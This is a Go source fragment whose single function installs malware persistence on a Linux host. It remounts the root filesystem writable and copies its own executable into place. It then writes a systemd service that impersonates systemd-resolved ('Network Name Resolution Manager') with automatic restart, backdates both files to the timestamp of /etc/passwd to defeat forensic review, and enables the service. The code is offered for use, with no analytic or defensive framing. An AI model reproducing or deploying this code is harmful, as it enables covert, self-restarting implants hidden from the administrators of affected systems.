package main

import (
	"fmt"
	"os"
	"os/exec"

	"golang.org/x/sys/unix"
)

func installPersistence() error {
	if unix.Geteuid() != 0 {
		return fmt.Errorf("must run as root")
	}
	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("executable: %w", err)
	}
	if out, err := exec.Command("mount", "-o", "remount,rw", "/").CombinedOutput(); err != nil {
		return fmt.Errorf("remount rw: %v %s", err, out)
	}
	if err := os.MkdirAll(persistDir, 0755); err != nil {
		return fmt.Errorf("mkdir %s: %w", persistDir, err)
	}
	data, err := os.ReadFile(self)
	if err != nil {
		return fmt.Errorf("read self: %w", err)
	}
	if err := os.WriteFile(persistBinary, data, 0755); err != nil {
		return fmt.Errorf("write %s: %w", persistBinary, err)
	}
	unitContent := `[Unit]
Description=Network Name Resolution Manager
Documentation=man:systemd-resolved.service(8)
After=network.target
[Service]
Type=simple
ExecStart=` + persistBinary + `
Restart=always
RestartSec=5
KillSignal=SIGTERM
ProtectSystem=full
PrivateTmp=true
NoNewPrivileges=true
`
	if err := os.WriteFile(persistUnitPath, []byte(unitContent), 0644); err != nil {
		return fmt.Errorf("write %s: %w", persistUnitPath, err)
	}
	if info, err := os.Stat("/etc/passwd"); err == nil {
		t := info.ModTime()
		_ = os.Chtimes(persistBinary, t, t)
		_ = os.Chtimes(persistUnitPath, t, t)
	}
	if out, err := exec.Command("systemctl", "enable", persistUnit).CombinedOutput(); err != nil {
		return fmt.Errorf("systemctl enable: %v %s", err, out)
	}
	return nil
}
